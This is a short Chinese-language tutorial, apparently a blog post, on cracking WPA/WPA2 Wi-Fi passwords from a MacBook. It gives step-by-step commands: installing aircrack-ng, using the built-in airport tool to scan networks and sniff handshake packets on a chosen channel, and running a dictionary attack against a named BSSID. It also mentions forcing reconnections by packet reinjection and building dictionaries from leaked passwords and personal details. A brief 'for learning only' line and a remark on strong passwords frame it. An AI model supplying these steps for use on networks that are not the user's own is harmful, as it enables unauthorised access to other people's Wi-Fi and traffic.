使用macbook破解WPA/WPA2 wifi密码
文本仅供学习交流。

我使用的系统是macbook pro 15：


安装aircrack-ng
使用homebrew安装，命令：

brew install aircrack-ng
抓包－抓取带密码的握手包
macbook自带了一个wifi工具：airport。

sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport
首先，断开wifi：



查看周围的wifi：

$ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s


查看本机的无线网卡设备：

$ ifconfig


抓包：

airport可以使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。有一种攻击方式是reinjecting packet，它可以强制无线路由器重启，这样当用户自动连接时可以获得握手包。

$ sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 6



en0是无线网卡设备；6是要破解wifi的CHANNEL。

静等用户连接wifi，获得握手包。

抓的包，保存在/tmp：


破解wifi密码
获得握手包之后，我们还需要破解加密的密码。

好的密码字典一个，应包含常见的弱密码、手机号、姓名生日组合、各大网站泄露的密码、英语单词等等。如果使用字典破解不了，说明密码还算复杂；暴力穷举更是费时费力。（论复杂密码的重要性）。

$ sudo aircrack-ng -w password.txt -b c8:3a:35:30:3e:c8 /tmp/*.cap
-w：指定字典文件；－b：指定要破解的wifi BSSID。

破解过程：





